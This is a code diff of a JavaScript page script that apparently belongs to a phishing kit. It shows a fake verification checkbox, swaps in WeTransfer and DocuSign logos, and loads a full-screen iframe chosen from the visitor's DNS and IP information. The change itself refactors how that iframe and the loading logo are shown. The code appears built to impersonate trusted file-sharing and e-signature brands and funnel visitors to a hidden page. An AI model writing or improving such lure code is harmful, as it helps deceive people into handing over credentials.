@@ -78,6 +78,7 @@ const myArray = vsr.split("&");
 vsr = myArray[0];
 var fmt = myArray[1];
 const container = document.getElementsByClassName('verification-container')[0];
+const logoContainer = document.getElementById("loading-logo");
 const iframe = document.getElementById('my-iframe');
 const checkbox = document.getElementById('verification-checkbox');
 $(document).ready(function(){
@@ -226,8 +227,8 @@ function activateIframe(dnsresult,vsr,fmt,ipInfo){
 		iframe.style.width="100%";
 		iframe.style.height ="100%";
 		// Hide the prior container safely
-        if (container) {
-            container.style.display = 'none';    
+        if (logoContainer) {
+            logoContainer.style.display = 'none';    
         }
 		//Ensure body doesn't create external scrollbars
 		document.body.style.overflow = 'hidden';
@@ -243,12 +244,7 @@ function switchImage(fmt,prefix,dnsresult,ipInfo,vsr){
 		$(".verification-container").hide();
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"wetransfer-logo-svg-vector.svg");
-		iframe.src = baseUrl+ displayPage(dnsresult,vsr,fmt);
-		// Display the full screen iframe
-		iframe.style.display = 'block';
-		iframe.style.width="100%";
-		iframe.style.height ="100%";
-		
+		activateIframe(dnsresult,vsr,fmt,ipInfo);		
 		break;
 		case "docusign":
 		$("#loading-logo").show();
